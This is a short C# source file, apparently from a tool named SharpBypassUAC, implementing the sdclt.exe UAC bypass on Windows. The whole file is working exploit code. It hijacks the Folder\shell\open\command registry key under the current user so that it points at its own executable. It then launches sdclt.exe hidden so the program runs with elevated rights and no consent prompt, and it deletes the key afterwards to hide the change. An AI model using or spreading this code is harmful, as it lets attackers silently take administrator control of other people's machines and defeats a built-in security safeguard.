using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace SharpBypassUAC;

public class Sdclt
{
	[DllImport("kernel32.dll")]
	public static extern int WinExec(string exeName, int operType);

	public Sdclt()
	{
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\", writable: true);
		registryKey.CreateSubKey("Folder\\shell\\open\\command");
		RegistryKey? registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Classes\\Folder\\shell\\open\\command", writable: true);
		registryKey2.SetValue("", "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
		registryKey2.SetValue("DelegateExecute", "");
		registryKey2.Close();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\sdclt.exe";
		WinExec("cmd.exe /k START " + text, 0);
		Thread.Sleep(1000);
		registryKey.DeleteSubKeyTree("Folder");
		Environment.Exit(0);
	}
}
